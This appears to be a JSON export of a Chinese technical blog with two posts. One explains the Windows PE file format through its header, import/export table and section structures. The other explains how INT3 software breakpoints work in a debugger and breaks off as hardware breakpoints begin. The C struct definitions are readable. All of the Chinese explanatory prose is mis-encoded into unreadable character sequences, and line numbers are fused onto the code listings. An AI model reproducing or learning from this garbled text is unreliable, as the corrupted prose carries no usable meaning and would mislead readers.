MZæ–‡ä»¶å¤´ï¼ˆIMAGE_DOS_HEADERï¼‰å’ŒDOSå—ï¼ˆDOS Stubï¼‰ã€‚DOSå¤´çš„æ€»é•¿ä¸º0x40hï¼ŒDOSå—æ€»é•¿ä¸å®šã€‚ 123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; åœ¨DOSå¤´æˆ‘ä»¬åªéœ€è¦é‡ç‚¹å…³æ³¨e_magicå’Œe_lfanewå³å¯ã€‚å‰è€…å°±æ˜¯MZæ ‡è¯†ï¼Œåè€…æŒ‡å‘PEç»“æ„å¼€å§‹çš„åœ°æ–¹ã€‚ NTå¤´NTå¤´ç”±PEæ–‡ä»¶å¤´æ ‡å¿—ï¼Œæ ‡å‡†PEå¤´ï¼Œæ‰©å±•PEå¤´ä¸‰éƒ¨åˆ†ç»„æˆã€‚PEæ–‡ä»¶å¤´æ ‡å¿—æ˜¯50 40 00 00ï¼Œä¹Ÿå°±æ˜¯PEï¼Œæˆ‘ä»¬ä»ç»“æ„ä½“çš„è§’åº¦çœ‹ä¸€ä¸‹PEæ–‡ä»¶å¤´çš„è¯¦ç»†ä¿¡æ¯ã€‚ PEæ–‡ä»¶å¤´æ ‡è¯†12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; //PEæ–‡ä»¶å¤´æ ‡å¿— =&gt; 4å­—èŠ‚ IMAGE_FILE_HEADER FileHeader; //æ ‡å‡†PEå¤´ =&gt; 20å­—èŠ‚ IMAGE_OPTIONAL_HEADER32 OptionalHeader; //æ‰©å±•PEå¤´ =&gt; 32ä½ä¸‹224å­—èŠ‚(0xE0) 64ä½ä¸‹240å­—èŠ‚(0xF0)&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; è¿™æ˜¯ç”¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„PEæ–‡ä»¶çš„æ ‡è¯† æˆ‘ä»¬ä½¿ç”¨åå…­è¿›åˆ¶å·¥å…·è½½å…¥ä¸€ä¸ªEXEæ–‡ä»¶æŸ¥çœ‹ åœ¨ç¬¬å››æ’å››ä¸ªå­—èŠ‚æŒ‡å‘çš„åœ°å€ä¸ºPEå¤´å¼€å§‹çš„åœ°æ–¹ï¼Œ50 45ä¹Ÿå°±æ˜¯PEï¼Œåœ¨PEæ ‡è¯†åå­˜åœ¨æœºå™¨ç ç”¨æ¥æ ‡è¯†ç¨‹åºä¸ºx64(0x8664)è¿˜æ˜¯x32(0x014C)ï¼Œä¾‹å¦‚è¿™é‡Œç”¨æ¥å±•ç¤ºçš„æ–‡ä»¶å°±æ˜¯ä¸€ä¸ª64ä½å¯æ‰§è¡Œç¨‹åºã€‚ æ ‡å‡†PEå¤´å…±æœ‰20ä¸ªå­—èŠ‚ 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //å¯ä»¥è¿è¡Œåœ¨å¤šå°‘ä½ç³»ç»Ÿä¸­ 0ä»£è¡¨ä»»æ„,32ä½:0x14C,64ä½:0x8664 WORD NumberOfSections; //èŠ‚çš„æ•°é‡ DWORD TimeDateStamp; //ç¼–è¯‘å™¨å¡«å†™çš„æ—¶é—´æˆ³ DWORD PointerToSymbolTable; //è°ƒè¯•ç›¸å…³ DWORD NumberOfSymbols; //è°ƒè¯•ç›¸å…³ WORD SizeOfOptionalHeader; //æ ‡è¯†æ‰©å±•PEå¤´å¤§å° WORD Characteristics; //æ–‡ä»¶å±æ€§ =&gt; 16è¿›åˆ¶è½¬æ¢ä¸º2è¿›åˆ¶æ ¹æ®å“ªäº›ä½æœ‰1,å¯ä»¥æŸ¥çœ‹ç›¸å…³å±æ€§&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; æ‰©å±•PEå¤´åŒ…å«ä»¥ä¸‹é‡è¦ä¿¡æ¯ æ‰€æœ‰å«ä»£ç çš„èŠ‚çš„æ€»å¤§å° æ‰€æœ‰å«å·²åˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å° æ‰€æœ‰å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„å¤§å° ç¨‹åºæ‰§è¡Œå…¥å£RVA ä»£ç çš„èŠ‚çš„èµ·å§‹RVA æ•°æ®çš„èŠ‚çš„èµ·å§‹RVA ç¨‹åºçš„å»ºè®®è£…è½½åœ°å€ å†…å­˜ä¸­çš„èŠ‚çš„å¯¹é½ç²’åº¦ æ–‡ä»¶ä¸­çš„èŠ‚çš„å¯¹é½ç²’åº¦ å†…å­˜ä¸­æ•´ä¸ªPEæ˜ åƒå°ºå¯¸ æ‰€æœ‰å¤´ï¼‹èŠ‚è¡¨çš„å¤§å° å¯¼å‡ºè¡¨ å¯¼å…¥è¡¨ èµ„æº é‡å®šä½è¡¨ è°ƒè¯•ä¿¡æ¯ ç‰ˆæƒä¿¡æ¯ å¯¼å…¥å‡½æ•°åœ°å€è¡¨ 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; //PE32: 10B PE64: 20B BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; //æ‰€æœ‰å«æœ‰ä»£ç çš„åŒºå—çš„å¤§å° ç¼–è¯‘å™¨å¡«å…¥ æ²¡ç”¨(å¯æ”¹) DWORD SizeOfInitializedData; //æ‰€æœ‰åˆå§‹åŒ–æ•°æ®åŒºå—çš„å¤§å° ç¼–è¯‘å™¨å¡«å…¥ æ²¡ç”¨(å¯æ”¹) DWORD SizeOfUninitializedData; //æ‰€æœ‰å«æœªåˆå§‹åŒ–æ•°æ®åŒºå—çš„å¤§å° ç¼–è¯‘å™¨å¡«å…¥ æ²¡ç”¨(å¯æ”¹) DWORD AddressOfEntryPoint; //ç¨‹åºå…¥å£RVA DWORD BaseOfCode; //ä»£ç åŒºå—èµ·å§‹RVA DWORD BaseOfData; //æ•°æ®åŒºå—èµ·å§‹RVA // // NT additional fields. // DWORD ImageBase; //å†…å­˜é•œåƒåŸºå€(ç¨‹åºé»˜è®¤è½½å…¥åŸºåœ°å€) DWORD SectionAlignment; //å†…å­˜ä¸­å¯¹é½å¤§å° DWORD FileAlignment; //æ–‡ä»¶ä¸­å¯¹é½å¤§å°(æé«˜ç¨‹åºè¿è¡Œæ•ˆç‡) WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; //å†…å­˜ä¸­æ•´ä¸ªPEæ–‡ä»¶çš„æ˜ å°„çš„å°ºå¯¸,å¯æ¯”å®é™…å€¼å¤§,å¿…é¡»æ˜¯SectionAlignmentçš„æ•´æ•°å€ DWORD SizeOfHeaders; //æ‰€æœ‰çš„å¤´åŠ ä¸ŠèŠ‚è¡¨æ–‡ä»¶å¯¹é½ä¹‹åçš„å€¼ DWORD CheckSum; //æ˜ åƒæ ¡éªŒå’Œ,ä¸€äº›ç³»ç»Ÿ.dllæ–‡ä»¶æœ‰è¦æ±‚,åˆ¤æ–­æ˜¯å¦è¢«ä¿®æ”¹ WORD Subsystem; WORD DllCharacteristics; //æ–‡ä»¶ç‰¹æ€§,ä¸æ˜¯é’ˆå¯¹DLLæ–‡ä»¶çš„,16è¿›åˆ¶è½¬æ¢2è¿›åˆ¶å¯ä»¥æ ¹æ®å±æ€§å¯¹åº”çš„è¡¨æ ¼å¾—åˆ°ç›¸åº”çš„å±æ€§ DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //æ•°æ®ç›®å½•è¡¨,ç»“æ„ä½“æ•°ç»„&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; å¦‚æœæƒ³è¦ç¼–å†™ä¸€ä¸ªPEè§£æå™¨ï¼Œé‚£ä¹ˆå°±éœ€è¦å…³æ³¨ä¸€ä¸‹FileAlignment ä»¥åŠ SizeOfHeaders è¿™ä¸¤ä¸ªæˆå‘˜ã€‚SizeOfHeaders è¡¨ç¤ºæ‰€æœ‰çš„å¤´åŠ ä¸ŠèŠ‚è¡¨æ–‡ä»¶å¯¹é½ä¹‹åçš„å€¼ï¼Œå¯¹é½çš„å¤§å°å‚è€ƒçš„å°±æ˜¯ FileAlignment æˆå‘˜ï¼Œå¦‚æœæ‰€æœ‰çš„å¤´åŠ ä¸ŠèŠ‚è¡¨çš„å¤§å°ä¸º320ï¼ŒFileAlignment ä¸º 200ï¼Œé‚£ä¹ˆ SizeOfHeaders å¤§å°å°±ä¸º 400ã€‚ä¸‹å›¾ä¸­0x20000å°±æ˜¯åœ¨å†…å­˜ä¸­å¯¹é½çš„å¤§å°ï¼Œ0x400æ˜¯ç¨‹åºåœ¨æ–‡ä»¶ä¸­çš„å¯¹å…¶å¤§å°ã€‚ æœ€åä¸€ä¸ªæˆå‘˜æ•°æ®ç›®å½•è¡¨å¾ˆé‡è¦ã€‚PEæ‰©å±•å¤´çš„æœ€åä¸€ä¸ªæˆå‘˜æ˜¯IMAGE_DATA_DIRECTORYç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; å­˜å‚¨äº†å¯¼å‡ºè¡¨å’Œå¯¼å…¥è¡¨ å¯¼å‡ºè¡¨ç»“æ„å¦‚ä¸‹ 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; // æŒ‡é’ˆæŒ‡å‘è¯¥å¯¼å‡ºè¡¨æ–‡ä»¶åå­—ç¬¦ä¸² DWORD Base; // å¯¼å‡ºå‡½æ•°èµ·å§‹åºå· DWORD NumberOfFunctions; // æ‰€æœ‰å¯¼å‡ºå‡½æ•°çš„ä¸ªæ•° DWORD NumberOfNames; // ä»¥å‡½æ•°åå­—å¯¼å‡ºçš„å‡½æ•°ä¸ªæ•° DWORD AddressOfFunctions; // æŒ‡é’ˆæŒ‡å‘å¯¼å‡ºå‡½æ•°åœ°å€è¡¨RVA DWORD AddressOfNames; // æŒ‡é’ˆæŒ‡å‘å¯¼å‡ºå‡½æ•°åç§°è¡¨RVA DWORD AddressOfNameOrdinals; // æŒ‡é’ˆæŒ‡å‘å¯¼å‡ºå‡½æ•°åºå·è¡¨RVA&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; å¯¼å‡ºè¡¨çš„ä½œç”¨å°±æ˜¯è®°è½½ç€åŠ¨æ€é“¾æ¥åº“çš„ä¸€äº›å¯¼å‡ºä¿¡æ¯ã€‚é€šè¿‡å¯¼å‡ºè¡¨ï¼ŒDLLæ–‡ä»¶å¯ä»¥å‘ç³»ç»Ÿæä¾›å¯¼å‡ºå‡½æ•°çš„åç§°ã€åºå·å’Œå…¥å£åœ°å€ç­‰ä¿¡æ¯ï¼Œä»¥ä¾¿WindowsåŠ è½½å™¨é€šè¿‡è¿™äº›ä¿¡æ¯æ¥å®ŒæˆåŠ¨æ€è¿æ¥çš„æ•´ä¸ªè¿‡ç¨‹ã€‚exeæ–‡ä»¶ä¸å­˜åœ¨å¯¼å‡ºè¡¨ï¼Œä¸€èˆ¬å­˜åœ¨äºDllæ–‡ä»¶ä¸­ï¼Œå¯¼å‡º å‡½æ•°ç»™åˆ«äººç”¨ã€‚ä¸æ¸…æ¥šDllæ–‡ä»¶ä½œç”¨çš„å¯è‡ªè¡Œç™¾åº¦ã€‚ å¯¼å…¥è¡¨ç»“æ„å¦‚ä¸‹ 12345678910typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; //å¯¼å…¥è¡¨ç»“æŸæ ‡å¿— DWORD OriginalFirstThunk; //RVAæŒ‡å‘ä¸€ä¸ªç»“æ„ä½“æ•°ç»„(INTè¡¨) &#125;; DWORD TimeDateStamp; //æ—¶é—´æˆ³ DWORD ForwarderChain; // -1 if no forwarders DWORD Name; //RVAæŒ‡å‘dllåå­—ï¼Œä»¥0ç»“å°¾ DWORD FirstThunk; //RVAæŒ‡å‘ä¸€ä¸ªç»“æ„ä½“æ•°ç»„(IATè¡¨)&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR; .exe æ–‡ä»¶å­˜åœ¨å¯¼å…¥è¡¨ï¼Œå°±æ˜¯å¯¼å…¥å‡½æ•°ï¼Œç„¶åè‡ªå·±ä½¿ç”¨ã€‚å¯¼å…¥è¡¨åœ¨PEæ–‡ä»¶åŠ è½½æ—¶ï¼Œä¼šæ ¹æ®è¿™ä¸ªè¡¨é‡Œçš„å†…å®¹åŠ è½½ä¾èµ–çš„DLL ï¼Œå¹¶å¡«å……æ‰€éœ€å‡½æ•°çš„åœ°å€ã€‚ OriginalFirstThunkæŒ‡å‘INTï¼ŒFirstThunkæŒ‡å‘IATï¼Œå½“æ–‡ä»¶åœ¨ç£ç›˜ä¸­æ—¶ï¼Œå®é™…ä¸Š INT å’Œ IAT çš„å†…å®¹æ˜¯ä¸€æ ·çš„ã€‚ è€Œå½“æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­æ—¶ INTè¡¨çš„ç»“æ„ä¸å˜ï¼Œè€ŒIATè¡¨åˆ™æ˜¯ç›´æ¥å­˜å‚¨äº†å‡½æ•°çš„åœ°å€ èŠ‚è¡¨èŠ‚è¡¨çš„ç»“æ„å¦‚ä¸‹ï¼Œæ•´ä½“ä¸º40ä¸ªå­—èŠ‚ã€‚å­˜å‚¨äº†PEä»£ç å’Œæ•°æ®çš„ç»“æ„æ•°æ®ï¼ŒæŒ‡ç¤ºè£…è½½ç³»ç»Ÿä»£ç æ®µåœ¨å“ªé‡Œï¼Œæ•°æ®æ®µåœ¨å“ªé‡Œç­‰ã€‚ åœ¨æ ‡å‡†PEå¤´ä¸­å®šä¹‰å¥½äº†æ–‡ä»¶èŠ‚çš„æ•°ç›®ã€‚ 123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; //ASCIIå­—ç¬¦ä¸² å¯è‡ªå®šä¹‰ åªæˆªå–8ä¸ªå­—èŠ‚ union &#123; //è¯¥èŠ‚åœ¨æ²¡æœ‰å¯¹é½ä¹‹å‰çš„çœŸå®å°ºå¯¸,è¯¥å€¼å¯ä»¥ä¸å‡†ç¡® DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; //å†…å­˜ä¸­çš„åç§»åœ°å€ DWORD SizeOfRawData; //èŠ‚åœ¨æ–‡ä»¶ä¸­å¯¹é½çš„å°ºå¯¸ DWORD PointerToRawData; //èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­çš„åç§» DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; //èŠ‚çš„å±æ€§&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; èŠ‚æ•°æ®å¸¸è§çš„èŠ‚æ•°æ®ï¼š.textï¼šä»£ç æ®µï¼Œæ˜¯åœ¨ç¼–è¯‘æˆ–æ±‡ç¼–ç»“æŸæ—¶äº§ç”Ÿçš„ä¸€ç§å—ï¼Œå®ƒçš„å†…å®¹å…¨éƒ¨æ˜¯æŒ‡ä»¤ä»£ç ã€‚ä¹Ÿæœ‰çš„ç¼–è¯‘å™¨å°†è¯¥æ®µå‘½åä¸º.code.dataï¼šåˆå§‹åŒ–çš„æ•°æ®å—ï¼Œæ˜¯åˆå§‹åŒ–çš„æ•°æ®å—ï¼ŒåŒ…å«é‚£äº›ç¼–è¯‘æ—¶è¢«åˆå§‹åŒ–çš„å˜é‡ã€å­—ç¬¦ä¸².idataï¼šè¾“å…¥è¡¨ï¼ŒåŒ…å«å…¶ä»–å¤–æ¥dllçš„å‡½æ•°å’Œæ•°æ®ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥è¡¨ï¼Œä¹Ÿæœ‰äººç§°ä¹‹ä¸ºå¯¼å…¥è¡¨ã€‚.rsrcï¼šèµ„æºæ•°æ®å—ï¼ŒåŒ…å«æ¨¡å—çš„å…¨éƒ¨èµ„æºæ•°æ®ï¼Œå¦‚å›¾æ ‡ã€èœå•ã€ä½å›¾ç­‰ã€‚.relocï¼šé‡å®šä½è¡¨ï¼Œç”¨äºä¿å­˜åŸºå€çš„é‡å®šä½è¡¨ã€‚å³å½“è£…åœ¨ç¨‹åºä¸èƒ½æŒ‰ç…§è¿æ¥å™¨æ‰€æŒ‡å®šçš„åœ°å€è£…è½½æ–‡ä»¶æ˜¯ï¼Œéœ€è¦å¯¹æŒ‡ä»¤æˆ–å·²ç»åˆå§‹åŒ–çš„å˜é‡è¿›è¡Œè°ƒæ•´ï¼Œè¯¥å—ä¸­ä¹ŸåŒ…å«äº†è°ƒæ•´è¿‡ç¨‹ä¸­æ‰€éœ€è¦çš„ä¸€äº›æ•°æ®ï¼Œå¦‚æœè£…è½½èƒ½å¤Ÿæ­£å¸¸è£…åœ¨åˆ™å¿½ç•¥æ­¤æ®µä¸­çš„æ•°æ®ã€‚.edataï¼šå¯¼å‡ºè¡¨ï¼Œæ˜¯peæ–‡ä»¶çš„è¾“å‡ºè¡¨ï¼Œä»¥ä¾›å…¶ä»–æ¨¡å—ä½¿ç”¨ï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªpeæ–‡ä»¶éƒ½æœ‰æ­¤æ•°æ®æ®µï¼Œå› ä¸ºæœ‰çš„æ–‡ä»¶å¹¶ä¸éœ€è¦è¾“å‡ºä¸€äº›å‡½æ•°ï¼Œè¯¥æ•°æ®æ®µå¸¸è§äºåŠ¨æ€è¿æ¥åº“æ–‡ä»¶ä¸­ã€‚.radataï¼šå­˜æ”¾è°ƒè¯•ç›®å½•ã€è¯´æ˜å­—ç¬¦ä¸²ï¼Œè¯¥æ•°æ®å—å¹¶ä¸å¸¸è§ä¸»è¦æ˜¯ç”¨äºå­˜æ”¾ä¸€äº›è°ƒè¯•ä¿¡æ¯ã€‚","categories":[{"name":"äºŒè¿›åˆ¶åŸºç¡€","slug":"äºŒè¿›åˆ¶åŸºç¡€","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"æ–­ç‚¹","slug":"æ–­ç‚¹","date":"2021-09-19T16:00:00.000Z","updated":"2024-05-12T13:37:50.391Z","comments":true,"path":"2021/09/20/æ–­ç‚¹/","permalink":"https://e1ectr0nlc.github.io/2021/09/20/%E6%96%AD%E7%82%B9/","excerpt":"â€‹ æ–­ç‚¹æ˜¯ç”¨äºå¸®åŠ©ç¨‹åºå‘˜åˆ†æbugå’Œè°ƒè¯•ç¨‹åºçš„ä¸€ç§æŠ€æœ¯ï¼Œè®©ç¨‹åºåœ¨åˆé€‚çš„åœ°æ–¹æš‚åœè¿è¡Œï¼ŒæŸ¥çœ‹å†…å­˜ä¿¡æ¯ã€‚æœ€å¼€å§‹æ˜¯åªé¡¾ç€ç”¨äº†ï¼Œæ²¡æœ‰äº†è§£è¿‡èƒŒåçš„åŸç†ã€‚ä»Šå¤©å°±æ¥ç®€å•äº†è§£ä¸€ä¸‹èƒŒåçš„æœºåˆ¶åŸç†ã€‚","text":"â€‹ æ–­ç‚¹æ˜¯ç”¨äºå¸®åŠ©ç¨‹åºå‘˜åˆ†æbugå’Œè°ƒè¯•ç¨‹åºçš„ä¸€ç§æŠ€æœ¯ï¼Œè®©ç¨‹åºåœ¨åˆé€‚çš„åœ°æ–¹æš‚åœè¿è¡Œï¼ŒæŸ¥çœ‹å†…å­˜ä¿¡æ¯ã€‚æœ€å¼€å§‹æ˜¯åªé¡¾ç€ç”¨äº†ï¼Œæ²¡æœ‰äº†è§£è¿‡èƒŒåçš„åŸç†ã€‚ä»Šå¤©å°±æ¥ç®€å•äº†è§£ä¸€ä¸‹èƒŒåçš„æœºåˆ¶åŸç†ã€‚ è½¯æ–­ç‚¹é¦–å…ˆçœ‹ä¸€æ¡æŒ‡ä»¤ 120x44332211 8BC3 MOV EAX, EBX#æŒ‡ä»¤åœ°å€ #æœºå™¨ç  #æ±‡ç¼–æŒ‡ä»¤ è¿™æ—¶æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªè½¯æ–­ç‚¹ï¼Œä¸€èˆ¬æˆ‘ä»¬æ˜¯é€šè¿‡ä¸­æ–­æŒ‡ä»¤INT3æ¥å®ç°ï¼Œè®¾ç½®åæŒ‡ä»¤å¦‚ä¸‹ 120x44332211 CCC3 MOV EAX, EBX#æŒ‡ä»¤åœ°å€ #æœºå™¨ç  #æ±‡ç¼–æŒ‡ä»¤ è¿™é‡Œè¦æ˜ç™½ä¸€ä¸ªæ¦‚å¿µï¼šæŒ‡ä»¤çš„æœºå™¨ç &#x3D;æ“ä½œç +æ“ä½œæ•° CPUåœ¨æ‰§è¡Œå®ŒINT3æŒ‡ä»¤åä¼šè§¦å‘å¼‚å¸¸ï¼Œæ­¤å¼‚å¸¸ä¼šä½¿æ“ä½œç³»ç»Ÿä»ä¸­æ–­å‘é‡è¡¨ä¸­è°ƒç”¨3å·ä¸­æ–­å¤„ç†ç¨‹åºï¼Œé¦–å…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨è°ƒè¯•å™¨ï¼Œå¦‚æœå­˜åœ¨è°ƒè¯•å™¨æŠŠå¼‚å¸¸äº¤ç»™è°ƒè¯•å™¨ï¼Œè°ƒè¯•å™¨å¤„ç†ç»“æŸå†è¿”å›ã€‚å¦‚æœè°ƒè¯•å™¨ä¸å¤„ç†æˆ–è€…å°±ä¸å­˜åœ¨è°ƒè¯•å™¨åˆ™å¼‚å¸¸ä¼šä¼ é€’åˆ°ç¨‹åºè‡ªèº«çš„å¼‚å¸¸å¤„ç†ä¸­ï¼ˆå¦‚æœæœ€åä¾ç„¶æ²¡å¤„ç†å°±ä¼šè¿›è¡Œå¼‚å¸¸çš„ç¬¬äºŒæ¬¡åˆ†å‘ï¼‰ã€‚ ä½†æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨INT3æ–­ç‚¹è°ƒè¯•æ—¶ï¼Œæ±‡ç¼–æŒ‡ä»¤å¹¶æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œè€Œæ˜¯ç»´æŒåŸæ ·ï¼Œä¹‹æ‰€ä»¥æˆ‘ä»¬ä¸‹æ–­ç‚¹çš„åœ°å€å¤„å­—èŠ‚æ²¡æœ‰å‘ç”Ÿä»»ä½•å˜åŒ–æ˜¯å› ä¸ºè°ƒè¯•å™¨ä¸ºäº†ç»´æŒæ±‡ç¼–ä»£ç çš„å¯è¯»æ€§å¹¶æ²¡æœ‰å°†æ”¹å˜åçš„æŒ‡ä»¤è¿›è¡Œé‡æ–°åæ±‡ç¼–ã€‚æˆ‘ä»¬å…ˆç”¨ç¨‹åºéªŒè¯ä¸€ä¸‹ï¼Œéšä¾¿åŠ è½½ä¸€ä¸ªç¨‹åº,åœ¨åœ°å€0x4015CEå¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ã€‚ æ¥ä¸‹æ¥æŠŠå³å°†è¿è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤æ”¹ä¸ºï¼š 1mov al , byte ptr ds:[0x4015CE] å°†ä¸‹å®Œæ–­ç‚¹åœ°å€å¤„çš„å€¼è¯»å…¥åˆ°å¯„å­˜å™¨$al$ä¸­ å½“æˆ‘ä»¬æ‰§è¡Œå®Œåœ°å€0x4015B1çš„ä»£ç åï¼Œå¯ä»¥çœ‹åˆ°$al$çš„å€¼ä¸º0xCCã€‚æ‰€ä»¥å½“$cpu$æ‰§è¡Œåˆ°æ–­ç‚¹(0x4015CE)æ—¶å°±ä¼šæ‰§è¡Œ0xCCï¼ˆINT3æŒ‡ä»¤ï¼‰ï¼Œæ¥ç€äº§ç”Ÿå¼‚å¸¸å»æ‰§è¡Œå‡½æ•°nt!KiTrap03( )ï¼Œæ¥ç€ä¼šè°ƒç”¨nt!KiDisPatchException( )å‡½æ•°å¹¶å°†å¼‚å¸¸åˆ†å‘ç»™è°ƒè¯•å™¨ï¼Œå…¶åˆšæ‰§è¡Œå®Œ0xCCæ­¤æ—¶$eip$æŒ‡å‘0xCCçš„ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œè°ƒè¯•å™¨ä¼šè®©$eip$å‡ä¸€ï¼Œç„¶å$eip$é‡æ–°æŒ‡å‘0xCCï¼ˆæ–­ç‚¹å¤„ï¼‰è€Œè°ƒè¯•å™¨å°†å…ˆè¿˜åŸæ­¤æ–­ç‚¹å¤„çš„åŸå­—èŠ‚ï¼Œç„¶åä½¿è¿”å›ç¨‹åºå°†åœåœ¨æ­¤æ–­ç‚¹å¤„ç­‰å¾…ç”¨æˆ·çš„è¿›ä¸€æ­¥æ“ä½œã€‚ æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ã€‚ è¿™æ¬¡æˆ‘ä»¬æŠŠæ–­ç‚¹å¤„çš„æ±‡ç¼–æŒ‡ä»¤æ”¹ä¸ºï¼š 1mov al , byte ptr ds:[0x4015CE] å¯¹åº”çš„åŸå­—èŠ‚A0ï¼Œæˆ‘ä»¬è¿è¡Œåˆ°æ–­ç‚¹åæŸ¥çœ‹å¯„å­˜å™¨EAX $al$çš„å€¼ç­‰äºA0ï¼Œè¯´æ˜æ–­ç‚¹å¤„çš„å­—èŠ‚å·²è¢«ä¿®å¤ã€‚ ä¸ºäº†è®©è¿™ä¸ªæ–­ç‚¹ä¸€ç›´ç”Ÿæ•ˆï¼Œç¨‹åºä¼šåˆ©ç”¨å•æ­¥å¼‚å¸¸æ¥æŠŠæ–­ç‚¹å¤„çš„å€¼å†æ”¹ä¸º0xCCã€‚å…¶åœ¨æ‰§è¡Œå®Œæ–­ç‚¹å¤„çš„æŒ‡ä»¤åï¼Œä¼šäº§ç”Ÿå•æ­¥å¼‚å¸¸ä»è€Œè¢«è°ƒè¯•å™¨æ•æ‰ï¼Œç„¶åè°ƒè¯•å™¨ä¼šå°†æ­¤æ–­ç‚¹å¤„çš„å€¼æ›´æ”¹ä¸º0xCCã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¦‚ä¸‹æ–¹æ³•éªŒè¯ã€‚ å°†æ–­ç‚¹åçš„æŒ‡ä»¤æ”¹ä¸ºï¼š 1mov al , byte ptr ds:[0x4015CE] æˆ‘ä»¬åœ¨æ–­ç‚¹æ‰§è¡Œè¯­å¥åçœ‹åˆ°$al$å€¼ä¸ºA0 æ‰§è¡Œåå°±æ”¹ä¸º0xCC å®é™…ä¸Šï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè°ƒè¯•å™¨ç»´æŠ¤äº†ä¸€å¤§ç»„è°ƒè¯•æ–­ç‚¹ï¼Œå¹¶æŠŠä»–ä»¬éƒ½æ¢æˆäº†INT 3ã€‚åœ¨è¢«è¿è¡Œç»“æŸåï¼Œä¼šå›å¡«å›å»ï¼Œå¹¶é€šè¿‡ç°åœ¨çš„åœ°å€åˆ¤æ–­æ˜¯åˆ°äº†é‚£ä¸ªæ–­ç‚¹ã€‚è½¯ä»¶æ–­ç‚¹æ²¡æœ‰æ•°ç›®é™åˆ¶ã€‚ ç¡¬æ–­ç‚¹ç¡¬ä»¶æ–­ç‚¹æ˜¯é€šè¿‡ä½äº CPU ä¸Šçš„ä¸€ç»„ç‰¹æ®Šå¯„å­˜å™¨æ¥å®ç°çš„ï¼Œç§°ä¸ºè°ƒè¯•å¯„å­˜å™¨ï¼Œä¸è¢«è°ƒè¯•ç¨‹åºæ— å…³ã€‚æ¯”å¦‚ x86 æ¶æ„çš„ CPU ä¸Šæœ‰ 8 